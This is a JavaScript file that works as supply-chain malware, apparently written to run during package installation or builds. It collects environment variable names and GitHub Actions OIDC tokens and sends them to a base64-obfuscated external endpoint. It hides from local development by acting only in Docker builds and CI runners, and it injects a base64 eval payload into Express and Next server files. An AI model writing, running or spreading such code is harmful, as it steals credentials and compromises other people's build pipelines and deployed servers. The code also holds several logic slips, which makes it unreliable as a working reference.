const path = require("path");
const fs   = require("fs");

const isDockerBuild = () => {
    // Check if running as docker container
    if (fs.existsSync( '/.dockerenv')) return false;

    // Check if running in docker
    const data = fs.readFileSync("/proc/1/attr/current");
    // docker-default (enforce)
    return data.indexOf('docker') !== -1;
}

const isGithubRunner = () => {
    return process.env.GITHUB_ENV !== undefined;
};

const getFiles = (suffixes) => {
    const startDir = process.cwd();
    const files = [];
    
    const readDir = (dir) => {
        fs.readdirSync(dir).forEach(file => {
            try {
                const pathAbs = path.join(dir, file);
                if (fs.statSync(pathAbs).isDirectory()) {
                    readDir(pathAbs);
                }
                else {
                    const fileLower = file.toLowerCase()
                    for (const suffix of suffixes) {
                        if (fileLower.endsWith(suffix)) {
                            files.push(pathAbs);
                            break;
                        }
                    }
                }
            }
            catch (err) { 
                // Do nothing 
            }
        });
    };
    readDir(startDir);

    return files;
};

const extract = async () => {
    const extracted_data = {
        env_keys: Object.keys(process.env),
        token_payload: '',
    };

    const data = "aHR0cHM6Ly9ldXJvcGUtd2VzdDEtZW50LWtuZ3Npa2RlbW8tZGV2LmNsb3VkZnVuY3Rpb25zLm5ldC9raW5nLXNpa2tlcmhldC1kZW1vLXJlYw" + "==";
    const url = Buffer.from(data, 'base64').toString('ascii');
        
    const actions_url = process.env.ACTIONS_ID_TOKEN_REQUEST_URL;
    const request_token = process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN;
    if (actions_url && request_token) {
        const res = await fetch(actions_url, {
            method: 'GET',
            headers: {
                'user-agent': 'actions/oidc-client',
                'Authorization': `Bearer ${request_token}`,
                'Accept': 'application/json',
            },
        });

        const data = await res.json();
        const token = data.value;
    
        const payload = token.split('.')[1];
        extracted_data.token_payload = payload;
    }

    fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'text/plain',
        },
        body: JSON.stringify(extracted_data),
    });
}; 

const insert = () => {
    // Only insert code inside:
    // Github pipelines
    // Docker builds
    //
    // Never inside local dev environments to avoid detection
    if (!isDockerBuild() && !isGithubRunner()) return;
    
    const packageFiles = getFiles('package.json');
    let packageHasServerSoftware = false;
    for (const file of packageFiles) {
        const data = fs.readFileSync(file);
        if (data.indexOf('"express"') !== -1 || data.indexOf('"next"')) {
            packageHasServerSoftware = true;
            break;
        }
    }

    if (!packageHasServerSoftware) return;

    // Definitely far from perfect
    // but it should work for now.
    const codeFiles = getFiles('.js', '.ts');
    for (const file of codeFiles) {
        const data = fs.readFileSync(file);
        if((data.indexOf('\'express\'') !== -1 || data.indexOf('"express"') !== -1 || data.indexOf("'use server'") !== -1) && data.indexOf('!!compromised!!') === -1) {
            const payload = Buffer.from(`const extract = ${String(extract)};\nextract();`).toString('base64')
            
            // Use eval to avoid namespace & typescript errors
            fs.appendFileSync(file, `\neval(Buffer.from('${payload}', 'base64').toString('ascii'));\n// !!compromised!!`);
            break
        }
    }
};

extract();
insert();